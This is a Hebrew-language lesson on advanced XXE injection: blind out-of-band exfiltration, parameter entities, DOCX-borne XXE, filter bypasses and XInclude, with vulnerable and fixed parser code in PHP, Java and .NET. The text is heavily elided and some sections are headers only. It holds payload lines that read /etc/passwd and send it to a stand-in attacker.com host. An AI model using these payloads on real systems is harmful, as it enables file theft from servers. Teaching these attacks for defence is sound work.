# הinjection XML מתקדמת - Advanced XXE

## מבוא

בקורס הבסיסי למדנו על XXE (XML External Entity) רגיל - הגדרת entity חיצוני שמצביע לקובץ מקומי או לכתובת חיצונית. בשיעור הזה נעמיק לטכניקות מתקדמות: XXE עיוור עם extraction out-of-band, XXE דרך קבצים שונים, parameter entities, ועוד.
...
כאשר התגובה של השרת לא מציגה את תוכן ה-entity, אנחנו צריכים טכניקות extraction חלופיות.
...
![תרשים זרימה שמראה כיצד ב-XXE עיוור השרת הפגיע טוען DTD חיצוני, קורא קובץ מקומי, ושולח את תוכנו לשרת התוקף בשיטת out-of-band](../../../images/illustrations/webadv-3-7-xxe-oob-exfil.svg)
...
```xml
<!-- The difference between a regular entity and a parameter entity -->

<!-- Regular entity - used in XML -->
<!ENTITY regular "value">
<!-- Usage: &regular; -->

<!-- Parameter entity - used only in DTD -->
<!ENTITY % param "value">
<!-- Usage: %param; -->
```
...
```xml
<!-- This doesn't work - you can't define an entity inside an entity -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY exfil SYSTEM "http://attacker.com/?data=%file;">

<!-- This works - a parameter entity inside an external DTD -->
<!-- because an external DTD allows defining nested entities -->
```
...
```bash
# Step 1 - create a valid DOCX
# or use an existing DOCX file

# Step 2 - extract the DOCX
mkdir docx_contents && cd docx_contents
unzip ../document.docx

# Step 3 - edit [Content_Types].xml or word/document.xml
```

```xml
<!-- word/document.xml with XXE -->
...
```php
// PHP - vulnerable by default in old versions
$xml = simplexml_load_string($input);

// PHP - vulnerable if LIBXML_NOENT is enabled
...
```java
// Vulnerable - SAX parser in Java
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.parse(inputStream, handler);

// Fixed - disable DTD and external entities
SAXParserFactory factory = SAXParserFactory.newInstance();
...
```csharp
// Vulnerable - old versions of .NET
XmlDocument doc = new XmlDocument();
doc.LoadXml(userInput);

// Fixed
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;  // disables entity resolution
doc.LoadXml(userInput);

// or with XmlReaderSettings
...
### הbypass חסימת SYSTEM

```xml
<!-- If SYSTEM is blocked, try PUBLIC -->
<?xml version="1.0"?>
<!DOCTYPE foo [
...
```xml
<!-- XInclude - doesn't require a DOCTYPE -->
...
## בניית DTD זדוני לextraction OOB

### DTD מלא לextraction קבצים
...
### DTD לextraction בבלוקים (לקבצים גדולים)
...
// PHP 8+ - safe by default, but worth verifying
$xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NONET);
```

```java
// Java - full mitigation
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
...
def process():
    data = request.get_json()  # simple and safe JSON
...
```python
# Check that uploaded files really are what they claim to be
import magic
...
- **Blind XXE** - extraction נתונים דרך OOB כשאין פלט ישיר
- **Error-based XXE** - extraction דרך הודעות שגיאה
